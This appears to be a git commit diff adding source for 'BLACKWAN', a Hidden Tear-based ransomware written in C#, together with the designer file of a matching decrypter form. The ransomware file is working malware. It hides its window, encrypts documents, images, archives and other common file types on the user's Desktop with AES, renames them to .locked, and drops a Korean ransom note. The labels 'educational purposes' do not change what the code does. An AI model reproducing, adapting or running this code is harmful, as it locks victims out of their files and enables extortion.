1707cb6dc2ece12cbb69ffd629121568485575be
DByoujin <help@esoftkorea.co.kr>
2021-01-25 17:08:36 +0900

    upload

---
+++ BLACKWAN-Decrypter/hidden-tear-decrypter/Form1.Designer.cs
@@ -0,0 +1,117 @@
+﻿namespace hidden_tear_decrypter
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.button1 = new System.Windows.Forms.Button();
+            this.label2 = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            this.SuspendLayout();
+            // 
+            // textBox1
+            // 
+            this.textBox1.Location = new System.Drawing.Point(97, 14);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(177, 21);
+            this.textBox1.TabIndex = 0;
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(24, 17);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(66, 12);
+            this.label1.TabIndex = 1;
+            this.label1.Text = "Password:";
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(28, 38);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(246, 29);
+            this.button1.TabIndex = 2;
+            this.button1.Text = "Decrypt";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(2, 103);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(295, 12);
+            this.label2.TabIndex = 3;
+            this.label2.Text = "이 랜섬웨어는 Hidden-tear를 사용한 랜섬웨어입니다.";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.label3.ForeColor = System.Drawing.Color.ForestGreen;
+            this.label3.Location = new System.Drawing.Point(77, 69);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(123, 20);
+            this.label3.TabIndex = 4;
+            this.label3.Text = "Files Decrypted!";
+            this.label3.Visible = false;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 12F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.White;
+            this.ClientSize = new System.Drawing.Size(299, 144);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.textBox1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.MaximizeBox = false;
+            this.Name = "Form1";
+            this.Text = "Decrypter";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Label label3;
+    }
+}
+
---
+++ BLACKWAN/hidden-tear/Form1.cs
@@ -0,0 +1,189 @@
+﻿/*
+ _     _     _     _              _                  
+| |   (_)   | |   | |            | |                 
+| |__  _  __| | __| | ___ _ __   | |_ ___  __ _ _ __ 
+| '_ \| |/ _` |/ _` |/ _ \ '_ \  | __/ _ \/ _` | '__|
+| | | | | (_| | (_| |  __/ | | | | ||  __/ (_| | |   
+|_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_|  
+ 
+ * Coded by Utku Sen(Jani) / August 2015 Istanbul / utkusen.com 
+ * hidden tear may be used only for Educational Purposes. Do not use it as a ransomware!
+ * You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent.
+ * 
+ * Ve durdu saatler 
+ * Susuyor seni zaman
+ * Sesin dondu kulagimda
+ * Dedi uykudan uyan
+ * 
+ * Yine boyle bir aksamdi
+ * Sen guluyordun ya gozlerimin icine
+ * Feslegenler boy vermisti
+ * Gokten parlak bir yildiz dustu pesine
+ * Sakladim gozyaslarimi
+ */
+
+using System;
+using System.Diagnostics;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Security;
+using System.Security.Cryptography;
+using System.IO;
+using System.Net;
+using Microsoft.Win32;
+using System.Runtime.InteropServices;
+using System.Text.RegularExpressions;
+
+
+namespace hidden_tear
+{
+    public partial class Form1 : Form
+    {
+        string userName = Environment.UserName;
+        string computerName = System.Environment.MachineName.ToString();
+        string userDir = "C:\\Users\\";
+
+
+
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            Opacity = 0;
+            this.ShowInTaskbar = false;
+            //starts encryption at form load
+            startAction();
+
+        }
+
+        private void Form_Shown(object sender, EventArgs e)
+        {
+            Visible = false;
+            Opacity = 100;
+        }
+
+        //AES encryption algorithm
+        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
+        {
+            byte[] encryptedBytes = null;
+            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
+            using (MemoryStream ms = new MemoryStream())
+            {
+                using (RijndaelManaged AES = new RijndaelManaged())
+                {
+                    AES.KeySize = 256;
+                    AES.BlockSize = 128;
+
+                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
+                    AES.Key = key.GetBytes(AES.KeySize / 8);
+                    AES.IV = key.GetBytes(AES.BlockSize / 8);
+
+                    AES.Mode = CipherMode.CBC;
+
+                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
+                    {
+                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
+                        cs.Close();
+                    }
+                    encryptedBytes = ms.ToArray();
+                }
+            }
+
+            return encryptedBytes;
+        }
+
+        //creates random password for encryption
+        public string CreatePassword(int length)
+        {
+            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
+            StringBuilder res = new StringBuilder();
+            Random rnd = new Random();
+            while (0 < length--){
+                res.Append(valid[rnd.Next(valid.Length)]);
+            }
+            return res.ToString();
+        }
+
+        //Sends created password target location
+        public void SendPassword(string password){
+            
+
+        }
+
+        //Encrypts single file
+        public void EncryptFile(string file, string password)
+        {
+
+            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
+            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
+
+            // Hash the password with SHA256
+            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
+
+            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);
+
+            File.WriteAllBytes(file, bytesEncrypted);
+            System.IO.File.Move(file, file+".locked");
+
+            
+            
+
+        }
+
+        //encrypts target directory
+        public void encryptDirectory(string location, string password)
+        {
+            
+            //extensions to be encrypt
+            var validExtensions = new[]
+            {
+                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".jpg", ".png", ".mp3", ".mp4", ".locked", ".pdf", ".docx", ".hwp", ".wav", ".zip", ".wav", ".flac", ".html", ".php"
+            };
+
+            string[] files = Directory.GetFiles(location);
+            string[] childDirectories = Directory.GetDirectories(location);
+            for (int i = 0; i < files.Length; i++){
+                string extension = Path.GetExtension(files[i]);
+                if (validExtensions.Contains(extension))
+                {
+                    EncryptFile(files[i],password);
+                }
+            }
+            for (int i = 0; i < childDirectories.Length; i++){
+                encryptDirectory(childDirectories[i],password);
+            }
+            
+            
+        }
+
+        public void startAction()
+        {
+            string password = CreatePassword(35);
+            string path = "\\Desktop";
+            string startPath = userDir + userName + path;
+            SendPassword(password);
+            encryptDirectory(startPath,password);
+            messageCreator();
+            string txtpath = "\\Desktop\\README.txt";
+            string fullpath = userDir + userName + txtpath;
+            string[] lines = { "한국어 " + userName + "님에게, \n귀하의 소중한 문서, 사진, 데이터베이스 및 기타 중요한 파일들이 BLACKWAN에 의해 암호화 되었습니다.\n======================================================================\n추가적인 바이러스 감염을 막기위해, 귀하의 모든 파일이 암호화 되었으며, 엑세스할 수 없습니다.\n\n파일들은 손상되지 않았지만, 잠깐 수정이 된것입니다. 따라서 다시 원본으로 되돌릴 수 있습니다.\n\n파일을 해독하는 유일한 방법은 개인 키와 복호화 프로그램을 받는것입니다.\n\n다른 소프트웨어로 파일을 수정할려고 하는 시도는 영원히 파일을 복구할 수 없게 만드는 것입니다.\n\n우리의 최첨단 복호화 프로그램은 귀하의 모든 파일을 100% 복호화 할 수 있음을 증명합니다.\n======================================================================\n이 랜섬웨어는 교육의 목적으로 만들어진 랜섬웨어입니다.\n혹시나 이 랜섬웨어에 감염이 되셨다면, 해당메일로 문의주세요!\nmail : help@esoftkorea.co.kr, DB유진\n\n- 이 key는 복호화 할때 사용되며 절대 README.txt를 삭제하시면 안됩니다. -\nPassword : " + password};
+            System.IO.File.WriteAllLines(fullpath, lines);
+            password = null;
+            System.Windows.Forms.Application.Exit();
+        }
+
+        public void messageCreator()
+        {
+
+        }
+    }
+}
